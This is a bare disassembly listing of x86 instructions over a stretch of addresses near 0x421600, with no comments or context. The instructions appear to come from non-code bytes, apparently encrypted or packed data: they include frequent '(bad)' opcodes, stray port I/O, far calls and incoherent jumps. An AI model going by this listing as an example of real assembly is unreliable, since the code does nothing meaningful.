  4215a7:	popf   
  4215a8:	or     ah,dh
  4215aa:	mov    dl,0x6b
  4215ac:	dec    edx
  4215ad:	mov    DWORD PTR [ecx+0x7b5ea718],esi
  4215b3:	dec    esp
  4215b4:	mov    ds:0xdbc3aa70,al
  4215b9:	jae    0x421580
  4215bb:	daa    
  4215bc:	push   eax
  4215bd:	imul   esi,DWORD PTR [edx],0x72
  4215c0:	push   ss
  4215c1:	push   edx
  4215c2:	retf   0x3213
  4215c5:	push   edx
  4215c6:	jl     0x42156e
  4215c8:	mov    edi,0xc4713e7b
  4215cd:	mov    BYTE PTR [ecx],ah
  4215cf:	mov    dh,0x20
  4215d1:	sub    eax,0x3c65122b
  4215d6:	xor    eax,0x8426b157
  4215db:	scas   al,BYTE PTR es:[edi]
  4215dc:	out    dx,eax
  4215dd:	jl     0x4215aa
  4215df:	jae    0x4215e3
  4215e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e2:	push   edx
  4215e3:	aad    0xf7
  4215e5:	xor    al,0x5a
  4215e7:	nop
  4215e8:	mov    dh,0x86
  4215ea:	mov    eax,ds:0x65362bc9
  4215ef:	mov    ebp,0x58c2b461
  4215f4:	inc    esi
  4215f5:	ins    BYTE PTR es:[edi],dx
  4215f6:	sub    BYTE PTR [esi-0x7b],bl
  4215f9:	fnstcw WORD PTR [ebx]
  4215fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215fc:	push   ds
  4215fd:	pushf  
  4215fe:	jg     0x4215dd
  421600:	sbb    eax,0xffffffef
  421603:	imul   ch
  421605:	pop    ebx
  421606:	jbe    0x421608
  421608:	push   edi
  421609:	scas   eax,DWORD PTR es:[edi]
  42160a:	pop    esi
  42160b:	xchg   ebp,eax
  42160c:	lahf   
  42160d:	stc    
  42160e:	jns    0x421613
  421610:	std    
  421611:	fcom   QWORD PTR [ebx]
  421613:	adc    BYTE PTR [edi-0x8],0xa6
  421617:	inc    ecx
  421618:	or     al,0x1
  42161a:	aas    
  42161b:	ins    DWORD PTR es:[edi],dx
  42161c:	(bad)  
  42161d:	in     eax,0x68
  42161f:	rol    al,1
  421621:	jg     0x4215b1
  421623:	jg     0x42166f
  421625:	test   eax,0x1713c9c
  42162a:	mov    eax,ds:0x91d8ab03
  42162f:	cmp    bh,BYTE PTR [edx+ebp*8+0x7a719205]
  421636:	shl    DWORD PTR [ebx-0x44],1
  421639:	mov    ecx,0x1a85393b
  42163e:	stc    
  42163f:	std    
  421640:	in     al,0xa6
  421642:	stos   DWORD PTR es:[edi],eax
  421643:	and    DWORD PTR [ebp+0x42],ebx
  421646:	inc    esp
  421647:	adc    DWORD PTR [ebx+0x38d753e],ecx
  42164d:	scas   eax,DWORD PTR es:[edi]
  42164e:	adc    DWORD PTR ds:0xa2996ee2,esi
  421654:	xchg   BYTE PTR [edi+0x71],bl
  421657:	imul   esi,DWORD PTR es:[edx],0x2fab5a94
  42165e:	popa   
  42165f:	jl     0x42165d
  421661:	xchg   edx,eax
  421662:	imul   esi,DWORD PTR [ecx-0x6f9820c5],0x17
  421669:	cdq    
  42166a:	aad    0x8
  42166c:	ins    BYTE PTR es:[edi],dx
  42166d:	adc    al,0xed
  42166f:	pop    ebp
  421670:	or     ah,dl
  421672:	mov    BYTE PTR [esi-0x6e],cl
  421675:	int3   
  421676:	rcr    eax,1
  421678:	mov    BYTE PTR [ecx+0x3d],ch
  42167b:	outs   dx,BYTE PTR ds:[esi]
  42167c:	sub    al,0x25
  42167e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42167f:	jo     0x421693
  421681:	shl    DWORD PTR [edx+0x3b],1
  421684:	ins    DWORD PTR es:[edi],dx
  421685:	xchg   esi,eax
  421686:	lea    esp,[eax+0x28]
  421689:	popa   
  42168a:	mov    ah,0xe2
  42168c:	gs xor eax,0x4e0bab61
  421692:	mov    bh,0x56
  421694:	add    bh,0xbc
  421697:	add    BYTE PTR [edi-0x50],cl
  42169a:	adc    al,0x75
  42169c:	out    dx,eax
  42169d:	inc    eax
  42169e:	jmp    0x421656
  4216a0:	ins    BYTE PTR es:[edi],dx
  4216a1:	mov    esi,0x534d9427
  4216a6:	fs mov dh,0x58
  4216a9:	das    
  4216aa:	lods   al,BYTE PTR ds:[esi]
  4216ab:	add    al,0xd1
  4216ad:	push   ss
  4216ae:	stc    
  4216af:	not    ah
  4216b1:	add    eax,0xf0673217
  4216b6:	out    0x9b,eax
  4216b8:	xchg   BYTE PTR [edx-0x1b1c771],dh
  4216be:	in     al,0x28
  4216c0:	popf   
  4216c1:	adc    bh,BYTE PTR [ebx+0x1]
  4216c4:	cwde   
  4216c5:	mov    ?,WORD PTR [ebp+0x119bdd10]
  4216cb:	pop    ecx
  4216cc:	and    eax,0x7f436a22
  4216d1:	cwde   
  4216d2:	adc    edi,DWORD PTR [ebp+ecx*8+0x31c6add8]
  4216d9:	and    bl,BYTE PTR [ebx+esi*2]
  4216dc:	adc    BYTE PTR [edi+0x12],bh
  4216df:	lahf   
  4216e0:	sub    DWORD PTR [ebp-0x2c612e60],esi
  4216e6:	cs fwait
  4216e8:	leave  
  4216e9:	popa   
  4216ea:	clc    
  4216eb:	mov    cl,0xab
  4216ed:	or     eax,0x4b536c7d
  4216f2:	mov    dh,0xe5
  4216f4:	clc    
  4216f5:	call   0xd6b8:0xbde568d3
  4216fc:	call   0x96a1:0x154c63a1
  421703:	sbb    bl,BYTE PTR [eax+0x54]
  421706:	xchg   ah,bh
  421708:	arpl   WORD PTR [edi],sp
  42170a:	pop    edx
  42170b:	imul   edx
  42170d:	into   
  42170e:	dec    esi
  42170f:	bound  esi,QWORD PTR [ebp+0x6f]
  421712:	fs addr16 loope 0x4216f5
  421716:	imul   edx,DWORD PTR [ecx+0x41d4dd8c],0x4a
  42171d:	ins    BYTE PTR es:[edi],dx
  42171e:	dec    edx
  42171f:	sub    al,0x6c
  421721:	jmp    0x4216a3
  421723:	shl    BYTE PTR [ecx],cl
  421725:	sub    DWORD PTR [ecx+eax*2+0xc],eax
  421729:	and    al,0x77
  42172b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42172c:	adc    edi,DWORD PTR [ecx+0x59d94d59]
  421732:	out    dx,al
  421733:	and    BYTE PTR [edi+ebx*4+0x0],0xbd
  421738:	test   eax,0x5f981a9e
  42173d:	jmp    0x421768
  42173f:	div    esp
  421741:	sbb    BYTE PTR [ebx-0x76e23373],ah
  421747:	sbb    dh,BYTE PTR [ebx+0x3062fc04]
  42174d:	icebp  
  42174e:	sub    cl,cl
  421750:	push   0x4a06c523
  421755:	sbb    eax,edx
  421757:	and    esi,ecx
  421759:	std    
  42175a:	repnz sbb BYTE PTR [ebp+0x56fb1e53],bh
  421761:	in     eax,dx
  421762:	neg    DWORD PTR [ebx+0x23adf6f]
  421768:	xor    bl,ah
  42176a:	cmp    BYTE PTR [bx-0x6],0x5f
  42176f:	aam    0xd7
  421771:	sbb    BYTE PTR [edx],ah
  421773:	xor    DWORD PTR [esi+eiz*1],ebx
  421776:	jmp    0x4087:0x261271f0
  42177d:	nop
  42177e:	jg     0x421781
  421780:	nop
  421781:	pop    ebx
  421782:	loop   0x4217b9
  421784:	sub    al,0x38
  421786:	(bad)  
  421787:	aad    0x27
  421789:	dec    eax
  42178a:	scas   eax,DWORD PTR es:[edi]
  42178b:	in     eax,dx
  42178c:	cmp    al,0xff
  42178e:	int    0xc0
  421790:	or     cl,al
  421792:	xchg   BYTE PTR [eax+edx*1-0x63347bc6],bl
  421799:	jbe    0x4217a2
  42179b:	ror    BYTE PTR [edx],1
  42179d:	ret    0xace6
  4217a0:	mov    ebx,0xc6f1a290
  4217a5:	mov    ebp,0x1ec66d72
  4217aa:	das    
  4217ab:	(bad)  [esi]
  4217ad:	ss pop ss
  4217af:	and    esp,DWORD PTR ds:0x20e747af
  4217b5:	or     BYTE PTR ds:0x84e427d7,cl
  4217bb:	imul   esp,DWORD PTR [esi+0x7badca8e],0x3d67e783
  4217c5:	out    dx,al
  4217c6:	inc    eax
  4217c7:	jb     0x42180a
  4217c9:	pop    es
  4217ca:	push   edi
  4217cb:	xor    BYTE PTR [esi+0x1a69942e],ah
  4217d1:	ret    0xc30d
  4217d4:	popf   
  4217d5:	inc    esp
  4217d6:	ret    
  4217d7:	and    eax,0xd94b0e51
  4217dc:	pop    edi
  4217dd:	cmp    ebp,DWORD PTR [ebx+0x45]
  4217e0:	sub    eax,0xf58a2f85
  4217e5:	sar    BYTE PTR [ecx],cl
  4217e7:	mov    BYTE PTR [eax-0x6c0329f],0x6
  4217ee:	cwde   
  4217ef:	jmp    0x1bcf:0x53c94f03
  4217f6:	arpl   WORD PTR [ecx+edi*8+0x69],ax
  4217fa:	sbb    ebp,DWORD PTR [esi-0x74]
  4217fd:	push   edi
  4217fe:	adc    edx,ebx
  421800:	cmp    dh,al
  421802:	push   ss
  421803:	push   es
  421804:	loope  0x4217a4
  421806:	push   edi
  421807:	test   BYTE PTR [ecx],ch
  421809:	addr16 jbe 0x42187f
  42180c:	mov    bh,0x6
  42180e:	add    al,0x28
  421810:	rcr    DWORD PTR [edi+0x34],0xe2
  421814:	mov    esp,0x715af6d6
  421819:	push   ds
  42181a:	out    dx,al
  42181b:	xor    esp,DWORD PTR [esi]
  42181d:	ret    
  42181e:	inc    esp
  42181f:	shl    BYTE PTR [esi-0x11be5fdd],1
  421825:	dec    eax
  421826:	jge    0x4217ac
  421828:	js     0x4217f9
  42182a:	pop    edx
  42182b:	add    ebp,DWORD PTR [ebp-0x64386b35]
  421831:	adc    ah,cl
  421833:	jl     0x421843
  421835:	leave  
  421836:	lea    edi,[ecx-0x2e036769]
  42183c:	mov    edx,0x13bab501
  421841:	mov    cl,0xa8
  421843:	push   ss
  421844:	xor    al,0xf9
  421846:	lock fdiv st(6),st
  421849:	sbb    ecx,DWORD PTR [esi+0x22]
  42184c:	pushf  
  42184d:	inc    eax
  42184e:	inc    ebx
  42184f:	or     al,0x33
  421851:	xor    ecx,DWORD PTR [eax-0x60]
  421854:	mov    esp,0x433363e9
  421859:	(bad)  
  42185a:	stc    
  42185b:	repz fdivp st(7),st
  42185e:	jnp    0x421806
  421860:	stos   BYTE PTR es:[edi],al
  421861:	inc    esp
  421862:	or     ebp,DWORD PTR [eax]
  421864:	ins    DWORD PTR es:[edi],dx
  421865:	(bad)  
  421866:	loope  0x4218ac
  421868:	adc    al,bh
  42186a:	arpl   WORD PTR [edx+0x76],si
  42186d:	mov    bh,dl
  42186f:	call   0xfd5ddd4
  421874:	out    dx,eax
  421875:	jo     0x421864
  421877:	lock sbb edi,DWORD PTR [edx+edi*4]
  42187b:	mov    bl,0x83
  42187d:	rol    DWORD PTR [ebx-0x751b68ab],1
  421883:	shl    DWORD PTR [ebp-0x4ae1841c],1
  421889:	xor    DWORD PTR [ebp+ebx*1+0x406a1aa4],ecx
  421890:	shr    BYTE PTR [edx],1
  421892:	dec    eax
  421893:	out    dx,al
  421894:	call   0x342b2ffe
  421899:	xchg   ebx,eax
  42189b:	xchg   dh,al
  42189d:	popa   
  42189e:	push   0x2a0b502d
  4218a3:	(bad)  
  4218a5:	fimul  DWORD PTR [ebx]
  4218a7:	ds (bad) 
  4218a9:	(bad)  [edx+0xc]
  4218ac:	jnp    0x4218cb
  4218ae:	test   eax,0xf9d4fa14
  4218b3:	mov    al,ds:0xe801d50
  4218b8:	push   ebp
  4218b9:	fsubr  QWORD PTR gs:[eax]
  4218bc:	xchg   edi,eax
  4218be:	push   eax
  4218bf:	add    bh,BYTE PTR ss:[ebx]
  4218c2:	sub    ecx,esp
  4218c4:	mov    eax,0xefdb2df2
  4218c9:	aaa    
  4218ca:	fstp   QWORD PTR [esi]
  4218cc:	sub    BYTE PTR ds:0x3e27e2f8,al
  4218d2:	and    DWORD PTR [esi-0x13],edx
  4218d5:	mov    eax,ds:0x5c10e016
  4218da:	mov    WORD PTR [edx],ss
  4218dc:	pop    esi
  4218dd:	mov    gs,WORD PTR ss:[eax+0x70]
  4218e1:	xor    BYTE PTR [ecx],dl
  4218e3:	mov    ecx,0x294c42e3
  4218e8:	jno    0x4218e0
  4218ea:	fsubr  QWORD PTR [ecx-0x12]
  4218ed:	push   ds
  4218ee:	cmp    eax,0xbf1763c7
  4218f3:	lea    ebp,[edi+0x47bcf8df]
  4218f9:	mov    dh,0x62
  4218fb:	jo     0x421921
  4218fd:	mov    al,0x10
  4218ff:	push   cs
  421900:	jmp    0x42188c
  421902:	xchg   DWORD PTR [edi+0x5c],ecx
  421905:	xchg   BYTE PTR [eax],dh
  421907:	mov    edx,0x914f974b
  42190c:	jb     0x421894
  42190e:	fdiv   DWORD PTR [esi]
  421910:	jl     0x4218fd
  421912:	ficom  DWORD PTR [ecx+0x18c596bf]
  421918:	sub    ch,dh
  42191a:	fcomp  QWORD PTR [eax-0x7e]
  42191d:	lock dec ebx
  42191f:	adc    BYTE PTR [ecx+ebx*2+0x18],ah
  421923:	test   al,0xb4
  421925:	sar    DWORD PTR [esi+eax*4],0xc4
  421929:	pop    eax
  42192a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42192b:	in     al,0x21
  42192d:	call   0xf3b9:0xece2740a
  421934:	nop    ebx
  421937:	mov    eax,0x8c13405
  42193c:	call   0x158d:0x2133c483
  421943:	lea    ebx,[ecx+0x7e]
  421946:	adc    ch,BYTE PTR [edi]
  421948:	in     al,dx
  421949:	push   eax
  42194a:	aas    
  42194b:	xchg   BYTE PTR [ebx+0x3ec3ea0],al
  421951:	aaa    
  421952:	lock cmp al,0x42
  421955:	dec    ebp
  421956:	ds jle 0x421905
  421959:	inc    esi
  42195a:	pop    esi
  42195b:	scas   al,BYTE PTR es:[edi]
  42195c:	out    0x4e,al
  42195e:	and    al,0x7b
  421960:	adc    ch,dh
  421962:	repz ffreep st(3)
  421965:	xor    BYTE PTR [eax],dh
  421967:	jg     0x4219c4
  421969:	and    DWORD PTR [esi],eax
  42196b:	ja     0x4218f7
  42196d:	xor    BYTE PTR [edx-0x1c],cl
  421970:	retf   
  421971:	icebp  
  421972:	mov    ebp,0xe21ae730
  421977:	call   0x7bfed2ca
  42197c:	psllw  mm0,mm1
  42197f:	push   ds
  421980:	jmp    0x4573:0xe2d52bef
  421987:	les    ebp,FWORD PTR [esi-0xe]
  42198a:	xlat   BYTE PTR ds:[ebx]
  42198b:	push   0xf87516dd
  421990:	sahf   
  421991:	push   esp
  421992:	daa    
  421993:	sub    ebx,esi
  421995:	adc    al,0x61
  421997:	sub    eax,0xa75f6f4
  42199c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42199d:	(bad)  
  42199e:	fstp   DWORD PTR [ebx+0x9]
  4219a1:	mov    ds,ecx
  4219a3:	inc    eax
  4219a4:	fisttp QWORD PTR [eax]
  4219a6:	gs and dl,0x93
  4219aa:	sub    dl,BYTE PTR [ebx-0x73]
  4219ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ae:	mov    cl,0xca
  4219b0:	out    0x29,al
  4219b2:	fwait
  4219b3:	cmp    esi,DWORD PTR [edx]
  4219b5:	cdq    
  4219b6:	jle    0x42198f
  4219b8:	mov    ds:0xbbaa3cc5,al
  4219bd:	push   ebp
  4219be:	add    BYTE PTR [edx+0xa],bl
  4219c1:	popa   
  4219c2:	cmp    DWORD PTR [eax],0x16b6bde2
  4219c8:	call   0x6247:0x4dae88b4
  4219cf:	xor    edx,DWORD PTR [eax+0x24]
  4219d2:	pusha  
  4219d3:	jle    0x421982
  4219d5:	push   ss
  4219d6:	cmp    al,0x46
  4219d8:	cmp    BYTE PTR [edi+0x2238aca8],dl
  4219de:	cwde   
  4219df:	pop    es
  4219e0:	mov    esi,DWORD PTR [esi+0x59]
  4219e3:	sbb    dh,dl
  4219e5:	fisubr WORD PTR [edx-0x21f03b08]
  4219eb:	loopne 0x4219b8
  4219ed:	jmp    0x421980
  4219ef:	and    eax,0x6c310cbb
  4219f4:	inc    ecx
  4219f5:	push   ebp
  4219f6:	dec    eax
  4219f7:	jns    0x4219fa
  4219f9:	inc    ebp
  4219fa:	cmp    DWORD PTR [esi],ebp
  4219fc:	xchg   DWORD PTR [ebx+eiz*2],ecx
  4219ff:	popa   
  421a00:	mov    bh,0xdb
  421a02:	and    DWORD PTR [ecx-0x395efc69],ecx
  421a08:	xor    DWORD PTR [ebx+0x3],ebp
  421a0b:	dec    edx
  421a0c:	cmp    edx,DWORD PTR [eax+0x7683690c]
  421a12:	sbb    eax,0x838c0c3a
  421a17:	repz arpl WORD PTR [edx],sp
  421a1a:	xchg   ebp,eax
  421a1b:	dec    esp
  421a1c:	mov    ds:0xc2b1b2aa,al
  421a21:	pop    eax
  421a22:	push   es
  421a23:	scas   eax,DWORD PTR es:[edi]
  421a24:	add    al,BYTE PTR [ecx+edi*8]
  421a27:	pop    esp
  421a28:	stos   BYTE PTR es:[edi],al
  421a29:	out    dx,eax
  421a2a:	test   eax,0xf3242b30
  421a2f:	dec    ebp
  421a30:	pop    ecx
  421a31:	fwait
  421a32:	adc    DWORD PTR [esi-0xbd53efa],ecx
  421a38:	retf   
  421a39:	adc    eax,0x41e17ad4
  421a3e:	in     al,dx
  421a3f:	ja     0x421a3c
  421a41:	test   BYTE PTR [eax+0x317be024],0xfb
  421a48:	xchg   ebp,eax
  421a49:	mov    esp,esp
  421a4b:	push   ss
  421a4c:	xchg   BYTE PTR [eax-0x62a64372],bl
  421a52:	adc    al,0x62
  421a54:	ins    BYTE PTR es:[edi],dx
  421a55:	lds    esp,FWORD PTR [esi]
  421a57:	int3   
  421a58:	xchg   DWORD PTR [eax-0x5dc223e4],eax
  421a5e:	pop    edi
  421a5f:	cs sbb edi,edi
  421a62:	test   al,0xc7
  421a64:	dec    esi
  421a65:	jle    0x421a6e
  421a67:	pop    ss
  421a68:	mov    esi,0xefb71afb
  421a6d:	ffree  st(2)
  421a6f:	sar    DWORD PTR [bp+di+0x79],cl
  421a73:	push   0xffffffb5
  421a75:	xor    cl,BYTE PTR [esi]
  421a77:	mov    eax,0x53cfee47
  421a7c:	(bad)  
  421a7d:	and    esi,DWORD PTR [edi]
  421a7f:	pop    esi
  421a80:	(bad)  
  421a82:	adc    al,0x21
  421a84:	and    eax,0xf2f27d1e
  421a89:	je     0x421afc
  421a8b:	hlt    
  421a8c:	or     DWORD PTR [ecx+ecx*1],esi
  421a8f:	(bad)  
  421a90:	sti    
  421a91:	out    dx,eax
  421a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a93:	ja     0x421a98
  421a95:	and    edi,ecx
  421a97:	ins    BYTE PTR es:[edi],dx
  421a98:	adc    BYTE PTR [ebp+edi*2-0x76d884aa],0x33
  421aa0:	jnp    0x421b1f
  421aa2:	inc    esp
  421aa3:	js     0x421ac4
  421aa5:	sbb    al,0x42
  421aa7:	lahf   
  421aa8:	sbb    al,0xa2
  421aaa:	neg    DWORD PTR [esi]
  421aac:	jmp    0xe01ab204
  421ab1:	sbb    BYTE PTR [esi],ah
  421ab3:	fldenv [ecx]
  421ab5:	push   esi
  421ab6:	fwait
  421ab7:	dec    ecx
  421ab8:	das    
  421ab9:	icebp  
  421aba:	sbb    eax,0x4d0e4714
  421abf:	repz pop ds
  421ac1:	jne    0x421aec
  421ac3:	push   ecx
  421ac4:	cdq    
  421ac5:	mov    dh,0x17
  421ac7:	adc    eax,0x90c2a991
  421acc:	xchg   edx,eax
  421acd:	xor    ebp,ebp
  421acf:	ins    DWORD PTR es:[edi],dx
  421ad0:	push   ds
  421ad1:	pushf  
  421ad2:	btr    esp,0x48
  421ad6:	fisttp DWORD PTR [eax]
  421ad8:	ret    
  421ad9:	rol    edi,1
  421adb:	push   es
  421adc:	and    DWORD PTR [ecx-0x55db34c5],esi
  421ae2:	mov    dl,0xa
  421ae4:	and    BYTE PTR [esi+0x17],bl
  421ae7:	(bad)  
  421ae8:	bound  edx,QWORD PTR [eax-0x6742e478]
  421aee:	dec    ebp
  421aef:	jae    0x421b08
  421af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421af2:	mov    dl,0x55
  421af4:	cmp    al,0xad
  421af6:	imul   edi,edi,0xabae827d
  421afc:	fbld   TBYTE PTR [ebp+eax*4-0x7b6afa91]
  421b03:	push   0x8251f3f5
  421b08:	fwait
  421b09:	push   eax
  421b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b0b:	push   ecx
  421b0c:	pusha  
  421b0d:	or     eax,0xad723776
  421b12:	(bad)  
  421b13:	ficomp DWORD PTR [edx-0x41d26288]
  421b19:	mov    eax,ds:0x729a0a4d
  421b1e:	ins    BYTE PTR es:[edi],dx
  421b1f:	or     eax,0x63c6ec3
  421b24:	dec    esp
  421b25:	dec    esi
  421b26:	inc    eax
  421b27:	and    dl,BYTE PTR [ecx+0x2f]
  421b2a:	out    0x2c,al
  421b2c:	aaa    
  421b2d:	cmp    BYTE PTR [esi+ebx*4+0x15],cl
  421b31:	jl     0x421b91
  421b33:	xor    eax,0x84db2968
  421b38:	sub    BYTE PTR [esi+edi*8+0x3c],0x34
  421b3d:	jecxz  0x421bac
  421b3f:	dec    esi
  421b40:	sub    bl,dh
  421b42:	(bad)  
  421b43:	or     al,0xef
  421b45:	and    DWORD PTR [ecx],ecx
  421b47:	and    al,0xd0
  421b49:	rcr    BYTE PTR [ebp+0x396e99c9],cl
  421b4f:	cmp    BYTE PTR [eax],0x8d
  421b52:	icebp  
  421b53:	(bad)  
  421b54:	jbe    0x421bb5
  421b56:	out    dx,al
  421b57:	outs   dx,DWORD PTR ds:[esi]
  421b58:	add    BYTE PTR [edx],ah
  421b5a:	or     al,0xc3
  421b5c:	inc    eax
  421b5d:	jg     0x421b05
  421b5f:	jb     0x421b15
  421b61:	jl     0x421b01
  421b63:	or     esp,esi
  421b65:	fmul   st(6),st
  421b67:	data16 sub al,0xa4
  421b6a:	lods   al,BYTE PTR ds:[esi]
  421b6b:	push   0x1caad4ca
  421b70:	aam    0x81
  421b72:	mov    eax,ds:0x25a4586e
  421b77:	dec    ecx
  421b78:	jp     0x421b0c
  421b7a:	sbb    dl,BYTE PTR [edx+0x25]
  421b7d:	into   
  421b7e:	jns    0x421b07
  421b80:	lds    esi,FWORD PTR [ecx+ebp*8+0x5f04c64a]
  421b87:	out    dx,al
  421b88:	xchg   ecx,eax
  421b89:	bound  esi,QWORD PTR [eax-0x78]
  421b8c:	sub    ah,BYTE PTR [ebp+0x53]
  421b8f:	leave  
  421b90:	add    ah,BYTE PTR [ebx+0x57]
  421b93:	jge    0x421b4b
  421b95:	jecxz  0x421bcf
  421b97:	push   edx
  421b98:	retf   0x66c8
  421b9b:	lods   al,BYTE PTR ds:[esi]
  421b9c:	xchg   esp,eax
  421b9d:	adc    edi,esi
  421b9f:	into   
  421ba0:	or     DWORD PTR [edi+0x8],ecx
  421ba3:	push   edx
  421ba4:	ins    BYTE PTR es:[edi],dx
  421ba5:	sbb    DWORD PTR [edx],ebx
  421ba7:	jge    0x421bdf
  421ba9:	inc    esp
  421baa:	scas   eax,DWORD PTR es:[edi]
  421bab:	(bad)  
  421bac:	jge    0x421c1b
  421bae:	jns    0x421b3c
  421bb0:	bound  esp,QWORD PTR [edi]
  421bb2:	pop    ds
  421bb3:	int3   
  421bb4:	jle    0x421b9d
  421bb6:	(bad)  [edi-0x7f3ff14]
  421bbc:	fst    DWORD PTR [ebx-0x31]
  421bbf:	mov    BYTE PTR [ecx+0x67],ah
  421bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bc3:	test   ebp,esi
  421bc5:	lock enter 0xa113,0x62
  421bca:	out    0x44,al
  421bcc:	pop    eax
  421bcd:	adc    DWORD PTR [edi+0x11],0x7d
  421bd1:	sbb    esp,DWORD PTR [edx+0x5a]
  421bd4:	sub    al,0x12
  421bd6:	addr16 dec esi
  421bd8:	pop    edi
  421bd9:	loope  0x421bb1
  421bdb:	push   edi
  421bdc:	inc    DWORD PTR [ebx+ecx*2+0x6f48bbdd]
  421be3:	std    
  421be4:	dec    ebp
  421be5:	outs   dx,BYTE PTR ds:[esi]
  421be6:	fnstsw WORD PTR [ebx+0x28172716]
  421bec:	mov    DWORD PTR [edi-0x44],ebx
  421bef:	std    
  421bf0:	imul   ebx,DWORD PTR [esi-0x6940288],0x21ee97ea
  421bfa:	xchg   edx,eax
  421bfb:	push   ecx
  421bfc:	mov    ebx,0xa7976749
  421c01:	xlat   BYTE PTR ds:[ebx]
  421c02:	xchg   edi,eax
  421c03:	pushf  
  421c04:	mov    eax,0xc18f7970
  421c09:	adc    bl,BYTE PTR [ebx]
  421c0b:	jmp    0x4708ab10
  421c10:	mov    ds:0x624a0a5b,al
  421c15:	jno    0x421c81
  421c17:	shl    ebp,0xdb
  421c1a:	add    esp,DWORD PTR [edx+0x3864803e]
  421c20:	cmp    al,0xa2
  421c22:	mov    dl,dl
  421c24:	in     eax,dx
  421c25:	inc    eax
  421c26:	pop    esi
  421c27:	loop   0x421c0e
  421c29:	mov    edx,0x131860b4
  421c2e:	out    0x1e,eax
  421c30:	mov    edi,0x23aec9c4
  421c35:	das    
  421c36:	xor    dh,BYTE PTR [edi+0x37]
  421c39:	fiadd  WORD PTR [ecx+0x78cb0545]
  421c3f:	adc    edi,DWORD PTR fs:[edi+0x9a72568]
  421c46:	push   ebp
  421c47:	pop    eax
  421c48:	or     esp,DWORD PTR [ebx-0xa9f1a80]
  421c4e:	stos   DWORD PTR es:[edi],eax
  421c4f:	jg     0x421cc8
  421c51:	(bad)  
  421c52:	aam    0x44
  421c54:	xchg   ebx,eax
  421c55:	inc    edi
  421c56:	ficomp WORD PTR [edx]
  421c58:	gs push eax
  421c5a:	xchg   edx,eax
  421c5b:	inc    edi
  421c5c:	mov    bl,0x1c
  421c5e:	and    eax,0x51f9e9a5
  421c63:	or     eax,0x8f395f71
  421c68:	int    0x6
  421c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c6b:	lods   eax,DWORD PTR ds:[esi]
  421c6c:	mov    edi,0x3f9b3102
  421c71:	pusha  
  421c72:	mov    bl,0x4
  421c74:	int3   
  421c75:	pop    ds
  421c76:	std    
  421c77:	sbb    al,0x78
  421c79:	pop    ds
  421c7a:	jge    0x421c0c
  421c7c:	nop
  421c7d:	xor    al,0x2
  421c7f:	shl    DWORD PTR [ebx],cl
  421c81:	mov    dh,0x1a
  421c83:	and    al,0x29
  421c85:	xchg   ebx,eax
  421c86:	xor    edx,0xffffff94
  421c89:	jns    0x421c71
  421c8b:	push   esi
  421c8c:	sbb    bh,BYTE PTR [ebp+eax*8-0x1e]
  421c90:	sti    
  421c91:	push   es
  421c92:	cli    
  421c93:	cwde   
  421c94:	(bad)  
  421c95:	js     0x421ce0
  421c97:	aam    0xee
  421c99:	fnstenv [edx]
  421c9b:	ss mov dh,0x4a
  421c9e:	jp     0x421c6d
  421ca0:	loope  0x421c71
  421ca2:	pop    ds
  421ca3:	js     0x421c3f
  421ca5:	pop    es
  421ca6:	sbb    DWORD PTR [edi+0x37de2d9b],ebp
  421cac:	clc    
  421cad:	xor    dl,bl
  421caf:	jns    0x421cfb
  421cb1:	nop
  421cb2:	push   es
  421cb3:	mov    ecx,0x6ceb9738
  421cb8:	cli    
  421cb9:	sbb    al,0xad
  421cbb:	adc    al,0x3a
  421cbd:	sbb    DWORD PTR [ebx+esi*2+0x4],esi
  421cc1:	loope  0x421cf7
  421cc3:	push   esp
  421cc4:	sbb    al,0x91
  421cc6:	xor    eax,0x62727132
  421ccb:	lds    edi,FWORD PTR [edi+0x72146b63]
  421cd1:	xor    BYTE PTR [eax],0xc
  421cd4:	test   al,0xc9
  421cd6:	xor    BYTE PTR [edi+0x7efc439e],0xe7
  421cdd:	loope  0x421c70
  421cdf:	dec    ebx
  421ce0:	retf   
  421ce1:	push   ebx
  421ce2:	fsubr  QWORD PTR [esi+0x435d30e7]
  421ce8:	leave  
  421ce9:	in     al,0xbc
  421ceb:	add    esp,DWORD PTR [edx-0x53b873e4]
  421cf1:	xchg   BYTE PTR ds:0xbb763a49,dl
  421cf7:	xchg   ebx,eax
  421cf8:	and    BYTE PTR [ecx],bl
  421cfa:	aad    0x28
  421cfc:	shr    DWORD PTR [ecx+0x4de0a4a7],cl
  421d02:	cmp    bl,BYTE PTR fs:[edx+0x7992b45f]
  421d09:	add    BYTE PTR [eax],al
  421d0b:	and    BYTE PTR [eax],al
  421d0d:	dec    ecx
  421d0e:	inc    esp
  421d0f:	inc    ecx
  421d10:	push   esp
  421d11:	scas   eax,DWORD PTR es:[edi]
  421d12:	add    eax,0x24abceb3
  421d17:	ret    0xc034
  421d1a:	mov    ch,0xae
  421d1c:	add    eax,0x1b2eb2a5
  421d21:	retf   0xa958
  421d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d25:	clc    
  421d26:	push   esi
  421d27:	test   eax,0x5f565412
  421d2c:	inc    ecx
  421d2d:	xchg   esp,eax
  421d2e:	aam    0x57
  421d30:	dec    esp
  421d31:	inc    edi
  421d32:	ror    ah,1
  421d34:	dec    esi
  421d35:	test   esp,edx
  421d37:	sbb    DWORD PTR [edi+0x3],eax
  421d3a:	call   0x3d78660d
  421d3f:	icebp  
  421d40:	lods   eax,DWORD PTR ds:[esi]
  421d41:	(bad)  
  421d43:	aaa    
  421d44:	fistp  QWORD PTR [esi-0x5e0ff89b]
  421d4a:	(bad)  
  421d4c:	dec    eax
  421d4d:	clc    
  421d4e:	mov    bl,0x7f
  421d50:	push   ss
  421d51:	lods   al,BYTE PTR ds:[esi]
  421d52:	sahf   
  421d53:	and    dh,BYTE PTR [esi]
  421d55:	out    dx,al
